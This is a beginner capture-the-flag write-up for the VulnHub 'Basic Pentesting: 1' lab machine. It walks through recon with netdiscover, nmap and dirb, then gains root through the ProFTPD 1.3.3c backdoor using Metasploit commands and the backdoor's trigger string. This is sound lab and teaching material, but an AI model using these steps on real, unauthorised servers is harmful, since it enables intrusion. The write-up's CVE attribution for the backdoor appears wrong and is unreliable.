# VulnHub Machine Solution Writeup: Basic Pentesting: 1

## 1. Introduction & Overview
* **Machine Name:** Basic Pentesting: 1
* **Difficulty:** Easy / Beginner
* **Description:** A Boot2Root VM designed for newcomers to penetration testing. It focuses on basic enumeration and exploiting known service vulnerabilities.
* **Goal:** Acquire root access.
* **Tools Used:**
    * Nmap (Port Scanning)
    * Netdiscover (Network Discovery)
    * Searchsploit (Exploit Search)
    * Metasploit / Python (Exploitation)

---

## 2. Lab Setup
* **Virtualization Software:** VirtualBox
* **Attacker Machine:** Kali Linux
* **Target Machine:** Basic Pentesting: 1 (Ubuntu-based)
* **Network Configuration:** NAT Network (Both machines on 10.0.2.x subnet)

---

## 3. Reconnaissance & Initial Access

### Network Discovery
**Goal:** Identify the IP address of the target machine within the network.

* **Tool:** `netdiscover`
* **Command:**
    ```bash
    sudo netdiscover -i eth0 -r 10.0.2.0/24
    ```
* **Result:**
    * **Target IP:** `10.0.2.14`
    * **MAC Address:** `08:00:27:xx:xx:xx` (VirtualBox CAD)

### Port Scanning & Service Enumeration
**Goal:** Identify open ports and the services running on them to map the attack surface.

* **Tool:** `nmap`
* **Command:**
    ```bash
    nmap -sC -sV -A -p- 10.0.2.14
    ```
    *(Flags: `-sC` default scripts, `-sV` version detection, `-A` aggressive scan, `-p-` all ports)*

**Key Findings:**

| Port | Protocol | Service | Version | Key Notes |
| :--- | :--- | :--- | :--- | :--- |
| **21** | TCP | FTP | **ProFTPD 1.3.3c** | **CRITICAL:** Known vulnerable version. |
| **22** | TCP | SSH | OpenSSH 7.2p2 | Ubuntu 16.04 |
| **80** | TCP | HTTP | Apache 2.4.18 | Hosting a default page. |

---

## 4. Detailed Enumeration & Vulnerability Identification

### Service Enumeration (FTP)
**Goal:** Investigate the FTP service for anonymous login or version vulnerabilities.

* **Tool:** `netcat` or `telnet` (Manual Banner Grabbing)
* **Command:**
    ```bash
    nc -nv 10.0.2.14 21
    ```
* **Findings:**
    * Banner confirmed: `ProFTPD 1.3.3c Server (ProFTPD Default Installation)`
    * Note: This specific version is infamous for containing a backdoor introduced by attackers into the source code distribution in 2010.

### Web Server Enumeration (Brief)
**Goal:** Check port 80 for alternative entry points.

* **Tool:** `dirb`
* **Command:**
    ```bash
    dirb [http://10.0.2.14](http://10.0.2.14)
    ```
* **Findings:**
    * Found directory: `/secret/`
    * Inside `/secret/`: A WordPress installation.
    * *Note:* While we could attack WordPress (using `wpscan` to enumerate users), the FTP vulnerability found above is much more critical and direct.

### Vulnerability Search
**Goal:** Correlate the ProFTPD version with known exploits.

* **Tool:** `searchsploit`
* **Search Queries:**
    1.  `searchsploit ProFTPD 1.3.3c`

**Selected Vulnerability:**
* **Vulnerability Name:** ProFTPD-1.3.3c Backdoor Command Execution
* **CVE ID:** CVE-2010-4221
* **Why this one?** The version matches exactly. This backdoor allows an attacker to send a specific command to get a root shell immediately, bypassing authentication.

---

## 5. Exploitation

### Exploit Retrieval & Preparation
* **Exploit Source:** Exploit-DB (or Metasploit)
* **Retrieval Command:**
    ```bash
    searchsploit -m unix/remote/15662.txt
    ```
    *(Note: This is often exploited manually or via Metasploit. Below shows the Metasploit method for reliability, but manual Python scripts exist as well.)*

### Execution (Metasploit Method)
**Goal:** Trigger the backdoor to gain a root shell.

1.  **Launch Metasploit:**
    ```bash
    msfconsole
    ```
2.  **Select Exploit:**
    ```bash
    use exploit/unix/ftp/proftpd_133c_backdoor
    ```
3.  **Configure Target:**
    ```bash
    set RHOSTS 10.0.2.14
    set RPORT 21
    ```
4.  **Execute:**
    ```bash
    exploit
    ```

**Alternative (Manual Python):**
If avoiding Metasploit, a Python script sending the command `HELP ACIDBITCHEZ` can trigger the shell.

* **Outcome:**
    * `[+] Backdoor service has been spawned, handling...`
    * `[+] UID: 0 (root) GID: 0 (root)`
    * **Shell Opened.**

---

## 6. Post-Exploitation

### Privilege Verification
**Goal:** Confirm root access.

* **Command:** `id`
* **Result:** `uid=0(root) gid=0(root) groups=0(root)`
* **Command:** `whoami`
* **Result:** `root`

### Flag Capture
* **Location:** `/root/` (Often just verifying root access is the goal here).
* **Command:**
    ```bash
    ls /root
    cat /root/proof.txt  # (If file exists)
    ```
* **Proof:**
    ```text
    uid=0(root) gid=0(root) groups=0(root)
    (Interactive shell confirmed)
    ```

---

## 7. Conclusion & Lessons Learned

### Summary
We identified the target IP using `netdiscover`. An Nmap scan revealed an open FTP port running **ProFTPD 1.3.3c**. Research via `searchsploit` indicated this version contained a critical backdoor. By utilizing the Metasploit module for this specific CVE, we instantly obtained a root shell, bypassing the need for user enumeration on the web server.

### Key Learnings
1.  **Version Checking is Vital:** The difference between a secure FTP server and a compromised one was simply the version number (`1.3.3c`).
2.  **Low-Hanging Fruit:** Always check for critical service exploits (like backdoors) before diving into complex web application attacks (like WordPress brute-forcing).
3.  **Historical Context:** Knowing that certain versions of software (like ProFTPD 1.3.3c or vsftpd 2.3.4) have legendary backdoors saves massive amounts of time during a pentest.
